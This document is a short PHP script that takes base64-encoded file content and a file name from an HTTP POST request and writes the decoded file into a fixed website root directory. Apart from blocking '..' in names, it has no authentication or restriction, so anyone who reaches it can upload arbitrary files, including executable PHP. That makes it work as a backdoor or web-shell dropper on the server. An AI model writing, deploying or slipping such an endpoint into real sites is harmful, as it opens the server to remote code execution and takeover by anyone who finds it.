<?php
// Write files to website root via HTTP POST
// POST: file=base64&name=filename
header('Content-Type: text/plain');
if (!isset($_POST['file']) || !isset($_POST['name'])) { exit('Usage: POST file=base64&name=filename'); }
$content = base64_decode($_POST['file']);
$name = ltrim($_POST['name'], '/');
if (strpos($name, '..') !== false) { exit('FAIL: no traversal'); }
// Absolute web root: /www/wwwroot/web01.com/
$webRoot = '/www/wwwroot/web01.com/';
$safe = $webRoot . $name;
$ok = file_put_contents($safe, $content);
echo $ok !== false ? "OK:$ok:$safe" : "FAIL:$safe";
?>
